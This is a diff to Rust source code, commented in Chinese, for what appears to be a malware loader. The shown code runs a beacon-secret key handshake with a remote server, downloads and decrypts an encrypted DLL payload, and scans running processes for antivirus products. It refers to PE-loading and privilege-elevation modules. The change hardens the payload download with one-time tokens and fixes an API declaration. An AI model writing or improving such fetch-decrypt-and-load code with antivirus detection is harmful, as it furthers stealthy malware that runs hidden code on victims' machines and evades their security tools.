@@ -185,11 +185,17 @@ fn main() {
             .build()
             .map_err(|e| format!("tokio runtime: {}", e))?;
 
-        let mut aes_key = rt.block_on(dll_fetch::handshake_core_key(
+        let (mut aes_key, download_token) = rt.block_on(dll_fetch::handshake_core_key(
             &key_server_url, &key_path, &build_id, &beacon_secret, &server_public_key))
             .map_err(|e| format!("handshake: {}", e))?;
 
-        let encrypted = rt.block_on(dll_fetch::download_core(&download_url))
+        // core.bin 下载带一次性凭证（防枚举）；旧服务端无凭证时原样下载
+        let dl_url = if download_token.is_empty() {
+            download_url
+        } else {
+            format!("{}?t={}", download_url, download_token)
+        };
+        let encrypted = rt.block_on(dll_fetch::download_core(&dl_url))
             .map_err(|e| format!("download: {}", e))?;
 
         let decrypted = dll_fetch::decrypt_dll(&encrypted, &aes_key)
@@ -490,7 +496,8 @@ fn check_av_processes() -> bool {
             fn CreateToolhelp32Snapshot(flags: u32, process_id: u32) -> *mut c_void;
             fn Process32FirstW(snapshot: *mut c_void, entry: *mut ProcessEntry32W) -> i32;
             fn Process32NextW(snapshot: *mut c_void, entry: *mut ProcessEntry32W) -> i32;
-            fn CloseHandle(handle: *mut c_void) -> i32;
+            // 签名与 pe_loader.rs/elevation.rs 对齐（*mut u8），避免 clashing extern 声明
+            fn CloseHandle(handle: *mut u8) -> i32;
         }
 
         const TH32CS_SNAPPROCESS: u32 = 0x00000002;
@@ -528,7 +535,7 @@ fn check_av_processes() -> bool {
                     for av in AV_PROCESSES {
                         if exe_name.eq_ignore_ascii_case(av) {
                             log!("[AV] detected process: {} (pid={})", exe_name, entry.th32_process_id);
-                            CloseHandle(snapshot);
+                            CloseHandle(snapshot as *mut u8);
                             return true;
                         }
                     }
@@ -539,7 +546,7 @@ fn check_av_processes() -> bool {
                 }
             }
 
-            CloseHandle(snapshot);
+            CloseHandle(snapshot as *mut u8);
         }
         false
     }
